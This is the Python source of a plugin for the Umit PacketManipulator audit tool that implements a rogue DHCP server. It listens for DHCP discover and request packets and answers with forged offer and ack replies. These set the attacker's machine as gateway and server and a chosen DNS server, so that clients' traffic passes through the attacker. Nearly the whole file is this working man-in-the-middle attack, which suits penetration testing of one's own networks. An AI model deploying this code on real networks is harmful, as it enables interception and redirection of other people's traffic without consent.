#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2008 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

import gtk
import time
import gobject

from threading import Thread
from socket import gethostbyname

from umit.pm.core.i18n import _
from umit.pm.core.logger import log
from umit.pm.core.netconst import *
from umit.pm.core.auditutils import is_ip, is_mac, IPPool, Netmask
from umit.pm.core.const import STATUS_ERR, STATUS_WARNING, STATUS_INFO

from umit.pm.gui.core.app import PMApp
from umit.pm.gui.plugins.core import Core
from umit.pm.gui.plugins.engine import Plugin
from umit.pm.manager.auditmanager import *

from umit.pm.backend import MetaPacket

AUDIT_NAME = 'dhcp-spoof'
AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'

BOOTP_REPLY = 2

class SpoofOperation(AuditOperation):
    has_stop = True
    has_start = True

    def __init__(self, sess, status, dnsip, netmask, pool, leasetm):
        AuditOperation.__init__(self)

        self.summary = AUDIT_MSG % _('Waiting for inputs')
        self.percentage = (self.percentage + 536870911) % \
                           gobject.G_MAXINT

        self.session = sess
        self.status = status

        self.dnsip = dnsip
        self.netmask = netmask
        self.pool = pool
        self.leasetm = leasetm

        self.pool_iter = iter(pool)

        self.status.set_sensitive(False)
        self.session.mitm_attacks.append(AUDIT_NAME)

    def start(self):
        self.state = self.RUNNING
        self.summary = AUDIT_MSG % _('Waiting for DHCP packets...')

        manager = AuditManager()
        manager.add_to_hook_point('dhcp-request', self.__on_request)
        manager.add_to_hook_point('dhcp-discover', self.__on_discover)

        return True

    def stop(self):
        manager = AuditManager()
        manager.remove_from_hook_point('dhcp-request', self.__on_request)
        manager.remove_from_hook_point('dhcp-discover', self.__on_discover)

        self.state = self.NOT_RUNNING
        self.summary = AUDIT_MSG % _('Stopped')

        self.status.set_sensitive(True)
        self.session.mitm_attacks.remove(AUDIT_NAME)

        return True

    def get_values(self, mpkt):
        values = {}

        for option in mpkt.get_field('dhcp.options'):
            if not isinstance(option, tuple):
                continue

            values[option[0]] = option[1]

        return values

    def setup_options(self, values):
        if 'message-type' in values:
            values.pop('message-type')

        for name, value in zip(('server_id', 'lease_time', 'renewal_time',
                                'subnet_mask', 'router', 'name_server'),
                               (self.session.context.get_ip1(),
                                self.leasetm, self.leasetm, self.netmask,
                                self.session.context.get_ip1(), self.dnsip)):
            values[name] = value

        return values

    def __on_request(self, mpkt):
        values = self.get_values(mpkt)

        spoof = MetaPacket.new_from_layer(mpkt, 'bootp')
        spoof.set_field('bootp.op', BOOTP_REPLY)

        if 'requested_addr' in values:
            client_ip = values.pop('requested_addr')
        else:
            client_ip = mpkt.get_field('bootp.ciaddr')

            if client_ip == '0.0.0.0':
                log.debug('Client ip is 0.0.0.0 Exit!')
                return

        spoof.set_field('bootp.yiaddr', client_ip)

        if 'server_id' in values:
            server_ip = values.pop('server_id')
        else:
            server_ip = self.session.context.get_ip1()

        spoof.set_field('bootp.siaddr', server_ip)

        options = self.setup_options(values)
        options['server_id'] = server_ip


        options = options.items()
        options.append(('message-type', 'ack'))
        options.append('end')

        spoof.set_field('dhcp.options', options)

        self.send_dhcp(self.session.context.get_ip1(),
                       mpkt.l3_src != '0.0.0.0' and mpkt.l3_src or '255.255.255.255',
                       mpkt.l2_src, spoof)

    def __on_discover(self, mpkt):
        values = self.get_values(mpkt)

        spoof = MetaPacket.new_from_layer(mpkt, 'bootp')
        spoof.set_field('bootp.op', BOOTP_REPLY)

        try:
            client_ip = self.pool_iter.next()
        except StopIteration:
            log.debug('No available IP address')
            return

        spoof.set_field('bootp.yiaddr', client_ip)
        spoof.set_field('bootp.siaddr', self.session.context.get_ip1())

        options = self.setup_options(values).items()
        options.append(('message-type', 'offer'))
        options.append('end')

        spoof.set_field('dhcp.options', options)

        self.send_dhcp(self.session.context.get_ip1(),
                       mpkt.l3_src != '0.0.0.0' and mpkt.l3_src or '255.255.255.255',
                       mpkt.l2_src, spoof)

    def send_dhcp(self, sip, dip, dmac, bootpkt):
        mpkt = MetaPacket.new('eth') / \
               MetaPacket.new('ip')  / \
               MetaPacket.new('udp') / bootpkt

        mpkt.set_field('eth.dst', dmac)
        mpkt.set_field('ip.src', sip)
        mpkt.set_field('ip.dst', dip)
        mpkt.set_field('udp.sport', 67)
        mpkt.set_field('udp.dport', 68)

        self.percentage = (self.percentage + 536870911) % \
                          gobject.G_MAXINT

        self.session.context.si_l2(mpkt)

class DHCPMitm(Plugin, ActiveAudit):
    __inputs__ = (
        ('ip_pool', ('', 'IP pool (optional)')),
        ('netmask', ('255.255.255.0', 'Netmask')),
        ('dnsip', ('', 'DNS Server IP')),
        ('lease_time', (1800, 'DHCP Lease time in seconds')),
    )

    def start(self, reader):
        a, self.status = self.add_mitm_attack(AUDIT_NAME,
                                              'DHCP spoofing',
                                              _('Start a rouge DHCP server'),
                                              gtk.STOCK_GO_UP)

    def stop(self):
        self.remove_mitm_attack(self.status)

    def execute_audit(self, sess, inp_dict):
        if AUDIT_NAME in sess.mitm_attacks:
            return

        pool    = inp_dict['ip_pool']
        netmask = inp_dict['netmask']
        dnsip   = inp_dict['dnsip']
        leasetm = min(1800, max(0, inp_dict['lease_time']))

        if not dnsip or not is_ip(dnsip):
            sess.output_page.user_msg(_('Not a valid DNS Server IP'),
                                      STATUS_ERR, AUDIT_NAME)
            return False

        if not netmask or not is_ip(netmask):
            sess.output_page.user_msg(_('Not a valid netmask'), STATUS_ERR,
                                      AUDIT_NAME)
            return False

        #try:
        #    _ = Netmask(netmask, dnsip)
        #except:
        #    sess.output_page.user_msg(_('Not a valid netmask'), STATUS_ERR,
        #                              AUDIT_NAME)
        #return False

        if not pool or (pool and not IPPool.ipaddress.match(pool)):
            s = dnsip.split('.')
            pool = IPPool(s[0] + '.' + s[1] + '.' + \
                          s[2] + '.' + str(int(s[3]) + 1) + '-255')

            sess.output_page.user_msg(
                _('Falling back to %s for IP pool') % repr(pool),
                STATUS_WARNING, AUDIT_NAME)
        else:
            pool = IPPool(pool)
            sess.output_page.user_msg(_('Using %s as IP pool') % repr(pool),
                                      STATUS_INFO, AUDIT_NAME)

        return SpoofOperation(sess, self.status, dnsip, netmask, pool, leasetm)

__plugins__ = [DHCPMitm]
__plugins_deps__ = [('DHCPMitm', ['DHCPDissector'], ['DHCPMitm-1.0'], []),]

__audit_type__ = 1
__protocols__ = (('dhcp', None), )
__vulnerabilities__ = (('DHCP spoofing', {
    'description' : 'DHCP spoofing is a type of attack on DHCP server to '
                    'obtain IP addresses using spoofed DHCP messages.\n'
                    'In the cases where the DHCP server is on a remote '
                    'network, and an IP address is required to access the '
                    'network, but since the DHCP server supplies the IP '
                    'address, the requester is at an impasse. To supply '
                    'access to the network, when the Pipeline receives a DHCP '
                    'Discover packet (a request for an IP address from a PC '
                    'on the network), it responds with a DHCP Offer packet '
                    'containing the configured (spoofed) IP address and a '
                    'renewal time, which is set to a few seconds. The '
                    'requester then has access to the DHCP server and gets a '
                    'real IP address. (Other variations exist in environments '
                    'where the APP server utility is running.)',
    'references' : ((None, 'http://en.wikipedia.org/wiki/DHCP'),)
    }),
)

